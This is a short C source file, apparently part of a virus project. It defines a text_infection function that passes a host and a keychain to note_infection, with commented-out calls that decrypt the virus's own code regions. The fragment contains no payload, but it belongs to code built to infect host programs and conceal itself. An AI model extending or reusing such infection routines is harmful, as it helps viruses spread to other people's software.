#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void text_infection(struct s_host *host, struct s_keychain *keychain)
{
//	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);

//	update_keychain_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
//	decrypt_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

	note_infection(host, keychain);
}
